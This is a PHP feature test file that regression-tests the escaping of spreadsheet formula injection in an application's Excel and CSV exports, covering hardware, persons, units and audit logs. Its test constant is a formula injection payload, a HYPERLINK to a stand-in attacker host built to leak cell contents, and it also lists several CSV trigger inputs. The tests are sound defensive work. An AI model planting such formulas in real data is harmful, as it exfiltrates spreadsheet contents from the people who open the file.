<?php

namespace Tests\Feature;

use App\Exports\HardwareAuditsExport;
use App\Exports\HardwareExport;
use App\Exports\PersonsExport;
use App\Exports\UnitsExport;
use App\Models\Hardware;
use App\Models\HardwareAudit;
use App\Models\Person;
use App\Models\Unit;
use App\Support\ExcelCell;
use Database\Seeders\PermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Session;
use Maatwebsite\Excel\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\Support\Concerns\InteractsWithTestSetup;
use Tests\TestCase;

covers(ExcelCell::class);

/**
 * Regression tests for issue #886 (Excel formula injection, CWE-1236).
 *
 * A stored value starting with '=' binds as TYPE_FORMULA in the served
 * sheet. The fix prefixes it with a single quote at map() time so the
 * cell stays TYPE_STRING — in xlsx AND in the audits csv route (?format=csv
 * carries no cell-type metadata, so only map() can fix it).
 */
class ExcelFormulaEscapeTest extends TestCase
{
    use InteractsWithTestSetup;
    use RefreshDatabase;

    private const PAYLOAD = '=HYPERLINK("https://attacker.test/?d="&A1,"open")';

    protected function setUp(): void
    {
        parent::setUp();
        Session::flush();
        $this->seed(PermissionSeeder::class);
        $this->seedLookupTables();
    }

    public function test_escape_prefixes_leading_equals_and_passes_rest_through(): void
    {
        $this->assertSame("'".self::PAYLOAD, ExcelCell::escape(self::PAYLOAD));
        $this->assertSame('-1+2', ExcelCell::escape('-1+2'));
        $this->assertSame('@mention', ExcelCell::escape('@mention'));
        $this->assertSame('', ExcelCell::escape(''));
        $this->assertSame(2, ExcelCell::escape(2));
        $this->assertNull(ExcelCell::escape(null));
    }

    public function test_unescape_reverses_escape_only_for_equals_prefixed_values(): void
    {
        // #1748: the restore paths read the stored, escaped form back into a
        // column, so they need the exact inverse of escape().
        $this->assertSame(self::PAYLOAD, ExcelCell::unescape(ExcelCell::escape(self::PAYLOAD)));
        $this->assertSame('=', ExcelCell::unescape("'="));
        $this->assertSame('-1+2', ExcelCell::unescape('-1+2'));
        $this->assertSame("'abc", ExcelCell::unescape("'abc"));
        $this->assertSame('', ExcelCell::unescape(''));
    }

    public function test_persons_export_escapes_formula_payload(): void
    {
        ['user' => $user, 'unit' => $unit] = $this->createUserWithUnit(['kargozini']);

        $person = Person::factory()->create([
            'f_name' => self::PAYLOAD,
            'l_name' => 'عسگری',
            'u_id' => $unit->id,
        ]);

        $export = new PersonsExport(Person::query()->where('id', $person->id));
        $row = $export->map($person->fresh(['semat', 'tahsil', 'estekhdam', 'radif', 'unit']));

        $this->assertContains("'".self::PAYLOAD, $row);

        // The escaped value must bind as string, not formula.
        $binder = new DefaultValueBinder;
        $this->assertSame(
            DataType::TYPE_STRING,
            $binder->dataTypeForValue("'".self::PAYLOAD)
        );
        $this->assertSame(
            DataType::TYPE_FORMULA,
            $binder->dataTypeForValue(self::PAYLOAD),
            'Precondition: the raw payload really binds as a formula on this stack.'
        );

        $this->actingAs($user);
    }

    public function test_hardware_export_escapes_formula_payload(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);
        $this->actingAs($user);

        $hardware = Hardware::factory()->create([
            'n_code' => $user->n_code,
            'pc_name' => self::PAYLOAD,
            'comments' => self::PAYLOAD,
        ]);

        $export = new HardwareExport(Hardware::where('id', $hardware->id), ['pc_name', 'comments']);
        $row = $export->map(Hardware::findOrFail($hardware->id));

        $this->assertSame(["'".self::PAYLOAD, "'".self::PAYLOAD], array_values($row));
    }

    public function test_units_export_escapes_formula_payload(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['organization']);
        $this->actingAs($user);

        $unit = Unit::factory()->create(['name' => self::PAYLOAD]);

        $export = new UnitsExport(
            collect([$unit]),
            [$unit->id => ['path' => self::PAYLOAD, 'depth' => 0, 'parent_name' => self::PAYLOAD]]
        );
        $row = $export->map($export->collection()->first());

        $this->assertContains("'".self::PAYLOAD, $row);
        $this->assertNotContains(self::PAYLOAD, $row);
    }

    public function test_audits_export_escapes_user_agent_payload_in_map(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);
        $this->actingAs($user);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);

        $audit = HardwareAudit::create([
            'hardware_id' => $hardware->id,
            'user_id' => $user->id,
            'action' => 'updated',
            'changes' => [['field' => 'cpu', 'old' => 'a', 'new' => self::PAYLOAD]],
            'source' => 'web',
            'ip_address' => '127.0.0.1',
            'user_agent' => self::PAYLOAD,
        ]);

        $export = new HardwareAuditsExport(HardwareAudit::where('id', $audit->id));
        $row = $export->map(HardwareAudit::findOrFail($audit->id));

        $this->assertContains("'".self::PAYLOAD, $row);
        $this->assertNotContains(self::PAYLOAD, $row);
    }

    public function test_observer_sanitises_user_agent_and_changes_at_source(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);
        $this->actingAs($user);
        // request() in tests is the already-bound instance; set the UA on it
        // directly so the observer persists the payload verbatim pre-fix.
        request()->headers->set('User-Agent', self::PAYLOAD);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);
        $hardware->update(['cpu' => self::PAYLOAD]);

        $audit = HardwareAudit::where('hardware_id', $hardware->id)
            ->where('action', 'updated')
            ->latest('id')
            ->first();

        $this->assertNotNull($audit);
        $this->assertSame("'".self::PAYLOAD, $audit->user_agent);

        $found = false;
        foreach ($audit->changes ?? [] as $entry) {
            foreach ((array) $entry as $value) {
                if ($value === self::PAYLOAD) {
                    $this->fail('Raw formula payload persisted in changes.');
                }
                if ($value === "'".self::PAYLOAD) {
                    $found = true;
                }
            }
        }
        $this->assertTrue($found, 'Expected the escaped payload in stored changes.');
    }

    public function test_audits_export_route_escapes_payload_in_xlsx_and_csv(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);

        HardwareAudit::create([
            'hardware_id' => $hardware->id,
            'user_id' => $user->id,
            'action' => 'updated',
            'changes' => [['field' => 'cpu', 'old' => 'a', 'new' => self::PAYLOAD]],
            'source' => 'web',
            'ip_address' => '127.0.0.1',
            'user_agent' => self::PAYLOAD,
        ]);

        $token = $user->createToken('test-token', ['hardware:read'])->plainTextToken;
        $headers = ['Authorization' => 'Bearer '.$token, 'Accept' => 'application/json'];

        // `Hardware::factory()` fires HardwareAuditObserver::created, so this
        // hardware has TWO audit rows: the observer's (user_agent = the test
        // client UA) and the payload row above. Both land in the same second —
        // `hardware_audits.created_at` is `timestamp(0)` — and the export sorts
        // by `latest('created_at')`, so their relative order is undefined. A
        // hardcoded cell address therefore reads whichever row Postgres
        // happened to place first, which is what made this test flake. Locate
        // the payload row by its own content instead, so the assertion is
        // about the escaping and not about row order.
        $userAgentColumn = array_search('کاربر آژنت', (new HardwareAuditsExport(HardwareAudit::query()))->headings(), true);

        $this->assertNotFalse($userAgentColumn, 'headings() lost the user_agent column');

        // xlsx: the stored user_agent cell must bind as string, not formula.
        $xlsx = $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export");
        $xlsx->assertStatus(200);
        $tmp = tempnam(sys_get_temp_dir(), 'audit-xlsx').'.xlsx';
        file_put_contents($tmp, $xlsx->streamedContent());
        $spreadsheet = IOFactory::load($tmp);
        $sheet = $spreadsheet->getActiveSheet();

        // Scan the user_agent column only — column A is the audit id, so a
        // whole-row scan would match on the wrong thing.
        $letter = Coordinate::stringFromColumnIndex($userAgentColumn + 1);
        $userAgents = [];
        for ($r = 2; $r <= $sheet->getHighestDataRow(); $r++) {
            $value = $sheet->getCell($letter.$r)->getValue();
            $userAgents[$r] = $value === null ? '' : (string) $value;
        }

        $this->assertTrue(
            in_array("'".self::PAYLOAD, $userAgents, true),
            'The exported sheet has no row carrying the escaped user_agent; got: '
                .json_encode($userAgents)
        );

        // Assert on the cell that actually carries the payload, whatever row
        // the tie-breaking left it in.
        $row = array_search("'".self::PAYLOAD, $userAgents, true);
        $cell = $sheet->getCell($letter.$row);
        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
        $this->assertSame("'".self::PAYLOAD, $cell->getValue());
        $spreadsheet->disconnectWorksheets();
        unlink($tmp);

        // csv: no cell-type metadata exists, so the raw payload must be gone.
        // (The writer CSV-quotes the field and doubles inner quotes, so
        // assert on the quote-normalised fragments, not the raw payload.)
        $csv = $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export?format=csv");
        $csv->assertStatus(200);
        $body = $csv->streamedContent();
        $this->assertStringContainsString("'=HYPERLINK", $body);
        $this->assertStringNotContainsString(',=HYPERLINK', $body);
    }

    // ==================== CSV-only triggers (#1766) ====================

    public function test_escape_for_csv_prefixes_every_trigger_and_leaves_the_rest(): void
    {
        $this->assertSame("'+1", ExcelCell::escapeForCsv('+1'));
        $this->assertSame("'-1", ExcelCell::escapeForCsv('-1'));
        $this->assertSame("'@SUM(1+1)", ExcelCell::escapeForCsv('@SUM(1+1)'));
        $this->assertSame("'\t=1+1", ExcelCell::escapeForCsv("\t=1+1"));
        $this->assertSame("'\r=1+1", ExcelCell::escapeForCsv("\r=1+1"));

        // '|' and '%' are not leading-formula triggers, so legitimate values
        // must survive untouched (gate correction: do not escape them).
        $this->assertSame('|summary', ExcelCell::escapeForCsv('|summary'));
        $this->assertSame('%CPU', ExcelCell::escapeForCsv('%CPU'));
        $this->assertSame('Mozilla/5.0', ExcelCell::escapeForCsv('Mozilla/5.0'));
        $this->assertSame(2, ExcelCell::escapeForCsv(2));
        $this->assertSame('', ExcelCell::escapeForCsv(''));
        $this->assertNull(ExcelCell::escapeForCsv(null));
    }

    public function test_escape_for_csv_is_not_double_applied_after_escape(): void
    {
        $this->assertSame("'=1+1", ExcelCell::escapeForCsv(ExcelCell::escape('=1+1')));
    }

    public function test_escape_still_does_not_touch_plus_minus_at(): void
    {
        // xlsx binds these as strings, so the shared guard must keep leaving
        // them alone — otherwise '-1+2' / '@mention' would be corrupted.
        $this->assertSame('+2+2', ExcelCell::escape('+2+2'));
        $this->assertSame('-1+2', ExcelCell::escape('-1+2'));
        $this->assertSame('@mention', ExcelCell::escape('@mention'));
    }

    public function test_csv_export_escapes_every_trigger_leading_value(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);

        $values = ['+2+2', '-1+2', '@SUM(1+1)', "\t=1+1", "\r=1+1"];

        foreach ($values as $value) {
            HardwareAudit::create([
                'hardware_id' => $hardware->id,
                'user_id' => $user->id,
                'action' => 'updated',
                'changes' => [['field' => 'cpu', 'old' => 'a', 'new' => $value]],
                'source' => 'web',
                'ip_address' => '127.0.0.1',
                'user_agent' => $value,
            ]);
        }

        $token = $user->createToken('test-token', ['hardware:read'])->plainTextToken;
        $headers = ['Authorization' => 'Bearer '.$token, 'Accept' => 'application/json'];

        $csv = $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export?format=csv");
        $csv->assertStatus(200);

        // CSV quotes every field (CSV enclosure required), so the escaped
        // value appears as the whole quoted field.
        $body = $csv->streamedContent();
        foreach ($values as $value) {
            // PhpSpreadsheet normalises a leading CR to LF when it assigns the
            // cell, so the "\r=1+1" field lands as "'" + LF + "=1+1".
            $rendered = str_replace("\r", "\n", $value);

            $this->assertStringContainsString(
                '"\''.$rendered.'"',
                $body,
                'Missing CSV-escaped value: '.json_encode($value)
            );
            $this->assertStringNotContainsString(
                '"'.$rendered.'"',
                $body,
                'Unescaped value leaked into CSV: '.json_encode($value)
            );
        }
    }

    public function test_xlsx_export_of_the_same_values_is_unchanged(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);

        $values = ['+2+2', '-1+2', '@SUM(1+1)'];

        foreach ($values as $value) {
            HardwareAudit::create([
                'hardware_id' => $hardware->id,
                'user_id' => $user->id,
                'action' => 'updated',
                'changes' => [['field' => 'cpu', 'old' => 'a', 'new' => $value]],
                'source' => 'web',
                'ip_address' => '127.0.0.1',
                'user_agent' => $value,
            ]);
        }

        $token = $user->createToken('test-token', ['hardware:read'])->plainTextToken;
        $headers = ['Authorization' => 'Bearer '.$token, 'Accept' => 'application/json'];

        $xlsx = $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export?format=xlsx");
        $xlsx->assertStatus(200);

        $tmp = tempnam(sys_get_temp_dir(), 'audit-xlsx').'.xlsx';
        file_put_contents($tmp, $xlsx->streamedContent());
        $spreadsheet = IOFactory::load($tmp);
        $sheet = $spreadsheet->getActiveSheet();

        $userAgentColumn = array_search('کاربر آژنت', (new HardwareAuditsExport(HardwareAudit::query()))->headings(), true);
        $this->assertNotFalse($userAgentColumn, 'headings() lost the user_agent column');
        $letter = Coordinate::stringFromColumnIndex($userAgentColumn + 1);

        $cells = [];
        for ($r = 2; $r <= $sheet->getHighestDataRow(); $r++) {
            $cell = $sheet->getCell($letter.$r);
            $cells[] = [$cell->getValue(), $cell->getDataType()];
        }

        foreach ($values as $value) {
            $this->assertContains(
                [$value, DataType::TYPE_STRING],
                $cells,
                'xlsx must carry the value unchanged as a string: '.json_encode($value)
            );
            $this->assertNotContains("'".$value, array_column($cells, 0));
        }

        $spreadsheet->disconnectWorksheets();
        unlink($tmp);
    }

    public function test_csv_export_never_persists_the_escaped_form(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);

        $audit = HardwareAudit::create([
            'hardware_id' => $hardware->id,
            'user_id' => $user->id,
            'action' => 'bulk_delete',
            'changes' => ['+2+2'],
            'source' => 'web',
            'ip_address' => '127.0.0.1',
            'user_agent' => '+2+2',
        ]);

        $token = $user->createToken('test-token', ['hardware:read'])->plainTextToken;
        $headers = ['Authorization' => 'Bearer '.$token, 'Accept' => 'application/json'];

        $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export?format=csv")
            ->assertStatus(200);

        $fresh = $audit->fresh();
        $this->assertSame('+2+2', $fresh->user_agent);
        $this->assertSame(['+2+2'], $fresh->changes);
    }

    public function test_unknown_export_format_is_rejected(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);

        $token = $user->createToken('test-token', ['hardware:read'])->plainTextToken;
        $headers = ['Authorization' => 'Bearer '.$token, 'Accept' => 'application/json'];

        foreach (['pdf', 'html', 'xls', 'ods', 'tsv', 'abc'] as $format) {
            $this->withHeaders($headers)
                ->getJson("/api/hardware/{$hardware->id}/audits/export?format={$format}")
                ->assertStatus(422)
                ->assertJsonValidationErrors('format');
        }

        $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export?format[]=csv")
            ->assertStatus(422)
            ->assertJsonValidationErrors('format');

        // The writer detector lowercases the extension, so ?format=CSV was a
        // working download before the guard and must stay one.
        $upper = $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export?format=CSV");
        $upper->assertStatus(200);
        $this->assertStringStartsWith('text/csv', (string) $upper->headers->get('content-type'));
    }
}
